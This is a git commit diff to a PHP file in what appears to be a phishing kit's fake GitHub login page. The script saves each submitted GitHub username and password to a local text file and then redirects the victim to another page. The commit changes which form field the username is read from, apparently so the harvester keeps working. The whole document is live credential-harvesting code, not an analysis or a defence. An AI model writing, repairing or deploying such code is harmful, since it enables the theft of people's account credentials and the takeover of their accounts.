928ebac387b6eecb3e8c4249c48e00cfc27c997c
Zetahorse <66515063+zetahourse@users.noreply.github.com>
2022-02-20 11:36:29 +0100

    Add files via upload

--- .sites/github/login.php
+++ .sites/github/login.php
@@ -1,6 +1,5 @@
 <?php
-
-file_put_contents("usernames.txt", "Github Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Github Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: yata.html');
 exit();
 ?>
